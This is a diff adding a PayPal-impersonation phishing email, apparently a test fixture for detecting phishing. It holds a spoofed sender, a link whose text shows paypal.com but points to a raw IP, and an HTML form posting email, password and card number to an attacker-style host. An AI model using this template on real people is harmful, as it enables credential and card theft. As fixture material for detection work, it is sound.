@@ -1,0 +1,34 @@
+From: "PayPal Security" <security@paypa1-alerts.tk>
+Reply-To: collect@evil-domain.ml
+To: victim@example.com
+Subject: URGENT: Your PayPal account has been SUSPENDED!
+Date: Thu, 29 May 2026 10:00:00 +0000
+Received: from mail.evil.xyz (mail.evil.xyz [1.2.3.4]) by mx.example.com with SMTP; Thu, 29 May 2026 10:00:01 +0000
+Authentication-Results: mx.example.com; spf=fail; dkim=none; dmarc=fail
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html>
+<body style="font-family: Arial, sans-serif;">
+<div style="display:none">SECURE EMAIL - ANTI-PHISHING TOKEN ABC123</div>
+<img src="http://bit.ly/paypal-logo" alt="PayPal" width="150">
+<h2 style="color:red">Your Account Has Been Suspended!</h2>
+<p>Dear Customer,</p>
+<p>We have detected <b>UNAUTHORIZED ACCESS</b> to your PayPal account.
+Your account has been temporarily suspended to protect your funds.</p>
+<p><b>You must verify your identity IMMEDIATELY or your account will be permanently closed within 24 hours!</b></p>
+<p>
+  <a href="http://1.2.3.4/paypal/verify?token=abc123&redirect=login">
+    http://www.paypal.com/verify
+  </a>
+</p>
+<form action="http://evil-domain.ml/collect" method="POST">
+  <p>Email: <input type="email" name="email"></p>
+  <p>Password: <input type="password" name="password"></p>
+  <p>Credit Card: <input type="text" name="cc"></p>
+  <p><input type="submit" value="Verify Account Now"></p>
+</form>
+<p>Failure to comply will result in legal action! The police have been notified of suspicious activity on your account.</p>
+<p>CLICK HERE NOW!!!</p>
+</body>
+</html>
